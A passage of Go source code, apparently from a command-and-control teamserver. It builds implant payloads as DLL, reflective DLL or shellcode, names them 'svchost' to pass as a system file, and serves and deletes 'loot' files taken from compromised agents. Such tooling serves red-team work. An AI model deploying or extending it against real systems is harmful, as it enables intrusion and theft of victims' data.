					} else if Format == "Windows Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_DLL)
						Ext = ".dll"
					} else if Format == "Windows Reflective Dll" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_REFLECTIVE_DLL)
						Ext = ".dll"
					} else if Format == "Windows Shellcode" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_RAW_BINARY)
						Ext = ".bin"
					} else {
						logger.Error("Unknown Format: " + Format)
						return
					}

					for i := 0; i < len(t.Listeners); i++ {
						if t.Listeners[i].Name == ListenerName {
							PayloadBuilder.SetListener(t.Listeners[i].Type, t.Listeners[i].Config)
						}
					}

					PayloadBuilder.SetExtension(Ext)

					if t.Profile.Config.Demon != nil && t.Profile.Config.Demon.Binary != nil {
						PayloadBuilder.SetPatchConfig(t.Profile.Config.Demon.Binary)
					}

					if PayloadBuilder.Build() {
						pal := PayloadBuilder.GetPayloadBytes()
						if len(pal) > 0 {
							err := t.SendEvent(PayloadBuilder.ClientId, events.Gate.SendStageless("svchost"+Ext, pal))
							if err != nil {
								logger.Error("Error while sending event: " + err.Error())
								return
							}
							PayloadBuilder.DeletePayload()
						}
					}
				}()
			} else {
				// send to Services
				for _, Agent := range t.Service.Agents {
					if Agent.Name == AgentType {
						var ConfigMap = make(map[string]any)

						err := json.Unmarshal([]byte(Config), &ConfigMap)
						if err != nil {
							logger.Error("Failed to Unmarshal json to object: " + err.Error())
							SendConsoleMsg("Error", "Failed to Unmarshal json to object: "+err.Error())
							return
						}

						var Options = map[string]any{
							"Listener": t.ListenerGetInfo(ListenerName),
							"Arch":     Arch,
							"Format":   Format,
						}

						Agent.SendAgentBuildRequest(ClientID, ConfigMap, Options)
					}
				}

			}
		}

	case packager.Type.Loot.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Loot.ListAll:
			// Send all loot indices to requesting client
			var ClientID string
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					ClientID = client.ClientID
					return false
				}
				return true
			})

			if ClientID != "" {
				indices, err := logr.LogrInstance.GetAllLootIndices()
				if err != nil {
					logger.Error("Failed to get loot indices: " + err.Error())
					return
				}

				err = t.SendEvent(ClientID, events.SendLootIndex(indices))
				if err != nil {
					logger.Error("Failed to send loot index: " + err.Error())
				}
			}
			break

		case packager.Type.Loot.ListAgent:
			// Send loot index for specific agent
			var ClientID string
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					ClientID = client.ClientID
					return false
				}
				return true
			})

			if ClientID != "" {
				if agentID, ok := pk.Body.Info["AgentID"].(string); ok {
					index, err := logr.LogrInstance.GetLootIndex(agentID)
					if err != nil {
						logger.Error("Failed to get loot index for agent " + agentID + ": " + err.Error())
						return
					}

					err = t.SendEvent(ClientID, events.SendLootAgentIndex(agentID, index))
					if err != nil {
						logger.Error("Failed to send agent loot index: " + err.Error())
					}
				}
			}
			break

		case packager.Type.Loot.SyncAll:
			// Send all loot indices to requesting client (same as ListAll)
			var ClientID string
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					ClientID = client.ClientID
					return false
				}
				return true
			})

			if ClientID != "" {
				indices, err := logr.LogrInstance.GetAllLootIndices()
				if err != nil {
					logger.Error("Failed to get loot indices: " + err.Error())
					return
				}

				err = t.SendEvent(ClientID, events.SendLootIndex(indices))
				if err != nil {
					logger.Error("Failed to send loot index: " + err.Error())
				}
			}
			break

		case packager.Type.Loot.GetFile:
			// Send specific loot file to client
			var ClientID string
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					ClientID = client.ClientID
					return false
				}
				return true
			})

			if ClientID != "" {
				if agentID, ok := pk.Body.Info["AgentID"].(string); ok {
					if relativePath, ok := pk.Body.Info["RelativePath"].(string); ok {
						logger.Debug("Dispatch: Processing loot file request for agentID: " + agentID + ", relativePath: " + relativePath)

						fileData, err := logr.LogrInstance.GetLootFile(agentID, relativePath)
						if err != nil {
							logger.Error("Failed to get loot file: " + err.Error())
							return
						}

						// Get metadata from master index instead of old per-agent index
						masterIndex, err := logr.LogrInstance.GetAllLootIndices()
						if err != nil {
							logger.Error("Failed to get master loot index: " + err.Error())
							return
						}

						var metadata *logr.LootMetadata
						// Find the metadata for this specific file
						for _, agentIndex := range masterIndex {
							if agentIndex.AgentID == agentID {
								for _, item := range agentIndex.Items {
									if item.RelativePath == relativePath {
										metadata = &item
										break
									}
								}
								if metadata != nil {
									break
								}
							}
						}

						if metadata != nil {
							logger.Debug("Dispatch: Found metadata, sending loot file response")
							err = t.SendEvent(ClientID, events.SendLootFile(agentID, relativePath, fileData, metadata))
							if err != nil {
								logger.Error("Failed to send loot file: " + err.Error())
							}
						} else {
							logger.Error("Failed to find metadata for loot file: " + agentID + "/" + relativePath)
						}
					}
				}
			}
			break

		case packager.Type.Loot.Delete:
			// Delete loot file from server
			if agentID, ok := pk.Body.Info["AgentID"].(string); ok {
				if relativePath, ok := pk.Body.Info["RelativePath"].(string); ok {
					logger.Info("Dispatch: Processing loot file deletion for agentID: " + agentID + ", relativePath: " + relativePath)

					err := logr.LogrInstance.DeleteLootFile(agentID, relativePath)
					if err != nil {
						logger.Error("Failed to delete loot file: " + err.Error())
						return
					}

					logger.Info("Successfully deleted loot file: " + agentID + "/" + relativePath)

					// Broadcast updated loot data to all clients
					indices, err := logr.LogrInstance.GetAllLootIndices()
					if err != nil {
						logger.Error("Failed to get updated loot indices after deletion: " + err.Error())
						return
					}

					// Send updated loot data to all connected clients
					t.Clients.Range(func(key, value any) bool {
						client := value.(*Client)
						err := t.SendEvent(client.ClientID, events.SendLootIndex(indices))
						if err != nil {
							logger.Error("Failed to send updated loot index to client " + client.Username + ": " + err.Error())
						}
						return true
					})
				}
			}
			break
		}

	case packager.Type.Heartbeat.Type:
		// Handle heartbeat to keep client session alive
		switch pk.Body.SubEvent {
		case packager.Type.Heartbeat.Ping:
			// Validate and refresh session
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					if client.SessionID != "" && t.AuthWrapper != nil {
						// Validate session (which automatically calls UpdateSessionActivity -> extends expires_at)
						session, err := t.AuthWrapper.ValidateSession(client.SessionID)
						if err != nil {
							// Session expired, try to refresh
							logger.Info(fmt.Sprintf("[HEARTBEAT] Session expired for user %s, refreshing", pk.Head.User))
							newSession, refreshErr := t.AuthWrapper.RefreshSessionForConnectedClient(client.Username, client.GlobalIP, "WebSocket")
							if refreshErr == nil && newSession != nil {
								client.SessionID = newSession.SessionID
								logger.Good(fmt.Sprintf("[HEARTBEAT] Session refreshed for user %s (new expires: %s)", pk.Head.User, newSession.ExpiresAt.Format("2006-01-02 15:04:05")))
							} else {
								logger.Warn(fmt.Sprintf("[HEARTBEAT] Failed to refresh session for user %s: %v", pk.Head.User, refreshErr))
							}
						} else if session != nil {
							logger.Debug(fmt.Sprintf("[HEARTBEAT] Session extended for user %s (expires: %s)", pk.Head.User, session.ExpiresAt.Format("2006-01-02 15:04:05")))
						}
					}
					return false
				}
				return true
			})
			break
		}
	}
}
